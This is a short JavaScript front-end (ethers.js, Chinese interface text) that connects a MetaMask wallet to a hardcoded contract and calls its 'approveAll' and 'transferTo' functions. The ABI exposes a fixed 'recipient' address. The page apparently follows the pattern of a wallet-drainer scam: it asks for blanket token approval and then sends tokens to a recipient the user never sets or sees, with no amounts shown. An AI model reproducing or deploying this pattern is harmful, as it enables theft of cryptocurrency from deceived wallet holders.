const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 替换为你的合约地址
const abi = [
	{
		"inputs": [],
		"name": "approveAll",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "transferTo",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_tokenAddress",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "recipient",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "token",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

let provider;
let signer;
let contract;

document.getElementById('connectWallet').onclick = async () => {
    try {
        if (window.ethereum) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            const account = await signer.getAddress();
            document.getElementById('walletAddress').textContent = `已连接: ${account}`;
            contract = new ethers.Contract(contractAddress, abi, signer);
        } else {
            alert("请安装MetaMask!");
        }
    } catch (error) {
        console.error(error);
    }
};

document.getElementById('approveAll').onclick = async () => {
    try {
        const tx = await contract.approveAll();
        document.getElementById('statusMessage').textContent = '授权进行中...';
        await tx.wait();
        document.getElementById('statusMessage').textContent = '授权成功!';
    } catch (error) {
        console.error(error);
        document.getElementById('statusMessage').textContent = '授权失败!';
    }
};

document.getElementById('transferTokens').onclick = async () => {
    try {
        const tx = await contract.transferTo();
        document.getElementById('statusMessage').textContent = '转移进行中...';
        await tx.wait();
        document.getElementById('statusMessage').textContent = '转移成功!';
    } catch (error) {
        console.error(error);
        document.getElementById('statusMessage').textContent = '转移失败!';
    }
};
